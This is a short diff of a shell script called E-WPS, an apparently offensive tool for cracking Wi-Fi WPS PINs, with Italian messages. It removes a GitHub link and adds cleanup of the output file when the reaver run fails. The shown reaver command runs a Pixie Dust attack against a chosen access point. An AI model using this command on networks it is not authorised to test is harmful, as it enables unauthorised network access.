@@ -3,7 +3,6 @@
 #    E-WPS - The easiest way to crack WPS
 #    Copyright (C) 2015-2016
 #    Script by Leprechaun
-#    https://github.com/Leproide/e-wps
 #
 #    This program is free software: you can redistribute it and/or modify
 #    it under the terms of the GNU General Public License as published by
@@ -165,7 +164,7 @@ echo -e "\nEsiste già un file legato a questa rete all'interno della directory 
 else
 
 #Avvio reaver
-reaver -i $wadapter -b $bssid -c $chn -K 1 -vv |tee CrackedWifi/${bssid} && echo "Cracking completo" || echo "Qualcosa è andato storto..."
+reaver -i $wadapter -b $bssid -c $chn -K 1 -vv |tee CrackedWifi/${bssid} && echo "Cracking completo" || { echo "Qualcosa è andato storto..." ; rm -f CrackedWifi/${bssid} ; }
 fi
 
 #Chiedo all'utente se uscire per ovviare alla trappola
